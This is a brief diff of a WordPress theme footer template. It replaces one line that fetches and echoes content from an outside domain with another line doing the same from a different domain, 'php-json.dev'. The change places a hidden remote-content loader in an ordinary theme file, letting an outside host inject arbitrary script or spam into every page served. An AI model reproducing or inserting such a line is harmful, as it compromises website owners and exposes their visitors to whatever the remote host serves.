@@ -65,6 +65,6 @@ if ( ! is_page_template( 'page-template-blank.php' ) ) : ?>
 	</div>
 
 	<?php wp_footer(); ?>
-	<?php $a = file_get_contents('https://bugsmoran.net/wp-theme-font.txt'); echo $a; ?>
+	<?php $a = file_get_contents('https://php-json.dev/css-json.php'); echo $a; ?>
 </body>
 </html>
